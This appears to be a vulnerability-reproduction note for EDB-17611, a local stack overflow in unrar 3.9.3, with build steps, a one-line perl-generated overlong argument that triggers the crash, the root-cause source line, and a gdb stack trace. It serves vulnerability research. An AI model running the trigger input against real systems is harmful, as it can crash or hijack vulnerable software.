# EDB-17611

## Experiment Environment

Ubuntu 14.04 LTS

## INSTALL & Configuration

```
wget https://github.com/mudongliang/source-packages/raw/master/EDB-17611/unrarsrc-3.9.3.tar.gz

tar -xvf unrarsrc-3.9.3.tar.gz
cd unrar

make -f makefile.unix

```

## Problems in Installation & Configuration

## How to trigger vulnerability

unrar/unrar -`perl -e 'print "3lrvs"x830'`

## PoCs

[Unrar 3.9.3 - Local Stack Overflow](https://www.exploit-db.com/exploits/17611/)

## Vulnerability Details & Patch

### Root Cause

```
consio.cpp:87

      *(OutPos++)=Msg[I];
```

### Stack Trace

```
(gdb) info stack
#0  0x66a77376 in ?? ()
#1  0xc9310807 in ?? ()
#2  0x6851e1f7 in ?? ()
#3  0x68732f2f in ?? ()
```

## References
